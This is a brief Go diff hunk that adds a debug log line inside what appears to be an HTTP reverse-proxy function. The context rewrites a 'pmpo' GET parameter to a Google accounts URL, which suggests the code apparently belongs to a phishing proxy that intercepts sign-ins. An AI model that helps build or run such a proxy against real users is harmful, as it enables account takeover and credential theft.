@@ -1161,6 +1161,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						// Additional step to replace a specific GET parameter
 						replaceGetParam(req, "pmpo", "https%3A%2F%2Faccounts.google.com")
+
+						log.Debug(req.URL.Path)
 					}
 				}
 
